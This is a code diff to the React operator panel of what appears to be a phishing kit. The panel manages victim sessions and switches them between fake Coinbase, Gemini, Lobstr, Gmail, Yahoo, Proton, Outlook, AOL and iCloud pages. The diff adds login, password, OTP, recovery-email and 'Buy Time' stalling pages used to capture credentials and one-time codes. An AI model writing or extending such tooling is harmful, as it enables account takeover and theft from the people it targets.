@@ -132,9 +132,13 @@ const MobileSessionCard = ({ session, onRedirect, onBan, onRemove, settings, isN
   const getDefaultPage = (brand) => {
     switch(brand) {
       case 'Lobstr': return 'lobstrloading.html';
-      case 'Yahoo': return 'yahooloading.html';
       case 'Gemini': return 'geminiloading.html';
-      case 'Gmail': return 'gmailloading.html';
+      case 'Proton': return 'protonlogin.html';
+      case 'Outlook': return 'outlooklogin.html';
+      case 'AOL': return 'aollogin.html';
+      case 'iCloud': return 'icloudlogin.html';
+      case 'Yahoo': return 'yahoowaiting.html';
+      case 'Gmail': return 'gmailwaiting.html';
       default: return 'loading.html'; // Coinbase default
     }
   };
@@ -339,7 +343,63 @@ const CategorizedPageSelect = ({ selectedPage, onPageChange, isHovered, selected
       Invalid: [
         { id: 'geminiinvalidseed.html', name: 'Invalid Seed' }
       ]
-    }
+    },
+    Proton: {
+      Introduction: [
+        { id: 'protonlogin.html', name: 'Login' },
+        { id: 'protonotp.html', name: 'OTP' },
+      ]
+    },
+    Outlook: {
+      Introduction: [
+        { id: 'outlooklogin.html', name: 'Login' },
+        { id: 'outlookotp.html', name: 'OTP' },
+      ]
+    },
+    AOL: {
+      Introduction: [
+        { id: 'aollogin.html', name: 'Login' },
+        { id: 'aolotp.html', name: 'OTP' },
+      ]
+    },
+    iCloud: {
+      Introduction: [
+        { id: 'icloudlogin.html', name: 'Login' },
+        { id: 'icloudotp.html', name: 'OTP' },
+      ]
+    },
+    Yahoo: {
+      Introduction: [
+        { id: 'yahoowaiting.html', name: 'Loading' },
+        { id: 'yahoologin.html', name: 'Login' },
+        { id: 'yahoopassword.html', name: 'Password' },
+        { id: 'gmailotp.html', name: 'OTP' }
+      ],
+      'Secure Account': [
+        { id: 'yahoocaptcha.html', name: 'Buy Time' },
+        { id: 'yahoorecovery.html', name: 'Recovery Email' },
+      ],
+      Others: [
+        { id: 'DisconnectWallet.html', name: 'Disconnect Wallet' },
+        { id: 'yahooinvalid.html', name: 'Invalid Pass' }
+      ]
+    },
+    Gmail: {
+      Introduction: [
+        { id: 'gmailwaiting.html', name: 'Loading' },
+        { id: 'gmaillogin.html', name: 'Login' },
+        { id: 'gmailpassword.html', name: 'Password' },
+        { id: 'gmailotp.html', name: 'OTP' }
+      ],
+      'Secure Account': [
+        { id: 'gmailreset.html', name: 'Reset Password' },
+        { id: 'gmailstall.html', name: 'Buy Time' },
+      ],
+      Others: [
+        { id: 'DisconnectWallet.html', name: 'Disconnect Wallet' },
+        { id: 'gmailinvalid.html', name: 'Invalid Pass' }
+      ]
+    },
   };
 
   const pageCategories = brandPages[selectedBrand] || brandPages.Coinbase
